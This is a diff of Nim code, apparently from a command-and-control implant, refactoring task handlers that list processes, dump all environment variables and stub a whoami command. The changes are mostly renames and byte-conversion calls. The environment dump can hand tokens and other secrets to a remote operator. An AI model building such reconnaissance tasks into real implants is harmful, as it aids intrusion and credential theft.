@@ -122,25 +122,24 @@ when defined(agent):
             for pid in processes: 
                 printProcess(pid)
 
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, output.toBytes())
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
-    import sugar
     proc executeEnv(config: AgentConfig, task: Task): TaskResult = 
 
         echo fmt"   [>] Displaying environment variables."
 
         try: 
-            var envVars: string = ""
+            var output: string = ""
             for key, value in envPairs(): 
-               envVars &= fmt"{key}: {value}" & '\n'
+               output &= fmt"{key}: {value}" & '\n'
                
-            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, envVars.toBytes())
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
 
     proc executeWhoami(config: AgentConfig, task: Task): TaskResult = 
 
@@ -148,8 +147,8 @@ when defined(agent):
 
         try: 
 
-            let message = "Not implemented"
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, message.toBytes())
+            let output = "Not implemented"
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(output))
 
         except CatchableError as err: 
-            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
